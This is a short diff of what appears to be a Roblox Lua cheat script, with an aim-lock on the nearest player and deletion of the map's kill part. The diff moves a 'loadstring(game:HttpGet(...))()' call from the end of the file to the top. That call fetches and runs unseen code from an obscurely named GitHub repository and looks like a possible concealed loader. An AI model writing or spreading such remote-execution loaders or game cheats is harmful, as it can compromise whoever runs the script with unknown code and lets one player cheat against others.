@@ -1,3 +1,5 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Tewtiy551/tewwwwwwwwwwwwwwww/main/tewwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww'))()
+
 local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/Loco-CTO/UI-Library/main/VisionLibV2/source.lua'))()
 
 local Window = Library:Create({
@@ -493,4 +495,3 @@ end
 
 game:GetService("RunService").RenderStepped:Connect(lockOnClosestPlayer)
 game.Workspace.Structure.Killpart:Destroy()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Tewtiy551/tewwwwwwwwwwwwwwww/main/tewwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww'))()
